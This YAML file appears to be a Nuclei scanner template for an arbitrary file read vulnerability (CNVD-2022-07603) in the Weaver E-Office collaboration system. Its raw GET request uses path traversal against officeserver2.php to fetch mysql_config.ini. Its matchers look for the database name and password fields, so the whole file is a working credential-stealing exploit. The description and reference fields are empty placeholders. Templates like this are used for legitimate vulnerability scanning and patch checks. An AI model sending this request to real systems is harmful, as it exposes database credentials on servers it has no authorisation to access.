id: weaver_office_officeserver2_fileread
info:
  author: mhb17
  description: description
  name: "\u6CDB\u5FAEE-Office\u534F\u540C\u7BA1\u7406\u7CFB\u7EDF\u5B58\u5728\u4EFB\
    \u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1ECNVD-2022-07603"
  reference:
  - https://
  severity: high
  tags: fileread
requests:
- matchers:
  - part: body
    type: word
    words:
    - 'dataname = '
  - part: body
    type: word
    words:
    - datapassword =
  - part: header
    type: word
    words:
    - '200'
  matchers-condition: and
  raw:
  - 'GET /iweboffice/officeserver2.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
    HTTP/1.1

    Host: {{Hostname}}

    Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/109.0.5414.120 Safari/537.36

    Connection: close


    '
